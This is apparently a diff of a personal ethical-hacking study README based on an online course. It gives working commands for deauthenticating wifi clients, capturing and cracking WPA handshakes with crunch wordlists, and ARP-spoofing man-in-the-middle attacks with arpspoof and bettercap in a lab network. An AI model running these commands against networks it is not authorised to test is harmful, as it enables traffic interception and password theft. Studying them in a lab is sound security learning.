@@ -1,27 +1,34 @@
 # Ethical-hacking
+Referred course:
+https://www.udemy.com/course/learn-ethical-hacking-from-scratch/
 
 This repo includes to perform penetration testting, hacking wep/wpa/wpa2 encrypted wifi using Kali linux and much more.
 
-wireless adapter:
+Preferred wireless adapter:
 1. should support monitor mode and packet injection.
 2. should support both 2.5GHz and 5GHz frequency.
 3. should be detectable in kali linux.
 
 Airodump-ng :
-1. is a part of aircrack-ng suit
+1. is a part of aircrack-ng suite
 2. its a packet sniffer.
 3. capture all pkts within range.
 4.display detailed info about network.
 5. connected clinets etc.
 
-1. tplink
-https://www.amazon.in/TP-Link-TL-WN722N-150Mbps-Wireless-Adapter/dp/B002SZEOLG?th=1
-tplink  v2 chipset doesnt support monitor mode, only v1 does.
+You cannot access built-in wireless adapted from your virtual kali machine thats why you need a external wireless adapter.
+1. my tplink wireless adapter AC1300 V3.0
+https://www.amazon.in/TP-Link-Wireless-Adapter-Archer-T4U/dp/B01MR6M8EC/ref=pd_sbs_147_1/262-7248665-7296922?_encoding=UTF8&pd_rd_i=B01MR6M8EC&pd_rd_r=ba922f0a-a740-41fd-a68d-bb0f62839dcc&pd_rd_w=89GYC&pd_rd_wg=74VJn&pf_rd_p=00b53f5d-d1f8-4708-89df-2987ccce05ce&pf_rd_r=D9QSQ8KF54HK6DRBAMVX&psc=1&refRID=D9QSQ8KF54HK6DRBAMVX
 
+It has realtek chipset and supports both 2.5Ghz and 5Ghz.
+tplink  v2 chipset doesnt support monitor mode, only v1 does.
+But you can configure v3 to support the v3 mode using below link.
 https://www.youtube.com/watch?v=UTO5mA9_Wm0 --> youtube link to install realtek chipset on kali and enable montior mode.
 
 
 =================
+
+Configure the kail linux with root/toor credentials and make sure wlan0 is detectable.
 
 WEP encryption algorithm:
 1. Its based on RC4.
@@ -41,13 +48,13 @@ airodump-ng --bssid F4:8C:EB:19:98:7E --channel 36 --write handshake wlan0
 3. perform deauth attack on a particular device.
 aireplay-ng --deauth 4 -a F4:8C:EB:19:98:7E -c 00:26:82:8D:21:1F wlan0
 
-
 4. create password file using crunch
-crunch 10 12 1235micky -o passwd.txt -t 
+crunch 10 12 1235micky -o passwd.txt
 
 5. cracking wpa/wpa2 using a crunch wordlist attack.
 aircrack-ng handshake-01.cap -w passwd.txt
 
+Note: Above command takes a lot of time if the size of wordlist is huge. Alternate way is to perform a twin AP attack. 
 
 ======================================================
 
@@ -130,3 +137,43 @@ check password in your database.
 select * from wpa_keys;
 
 =================================================
+
+1. netdiscover is a tool to discover all the network devices connected to a wife including their mac addresses and manufacturer.
+netdiscover -r 192.168.0.1/24
+
+2. nmap/zenmap
+type zenmap on terminal, a GUI window would pop up.
+zenmap ia nothing but a GUI to run nmap.
+Run a ping scan or quick scan to get loads of info.
+
+====================================================
+
+MITM using ARP spoofing
+
+Its a 2 step process:
+Consider eth0 is the wired interface of hacker's kali machine.
+Make sure network is NATNETWORK for both kali machine and victim machine
+
+10.0.2.1 -> default gw
+10.0.2.4 -> victim's ip
+
+1. Send ARP response to router(default gw) saying eth0 interface is at the IP of vicitm. -> Here router will update its arp table with eth0 MAC.
+arpspoof -i eth0 -t 10.0.2.1 10.0.2.4
+
+2. Send ARP response to victim saying eth0 is your default gateway. -> Here victim will update its arp table with eth0 mac.
+arpspoof -i eth0 -t 10.0.2.4 10.0.2.1 
+
+Now after this router will think victim is at eth0 and victim will think router is at eth0.
+So all packets exchange between victim and router will go through eth0 interface and this is called Man in the middle attack.
+
+One last step is to enable ip forwarding on kali machine.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# ARP spoofing using bettercap
+bettercap -iface eth0
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.0.2.4
+arp.spoof on
+net.spoof on
+
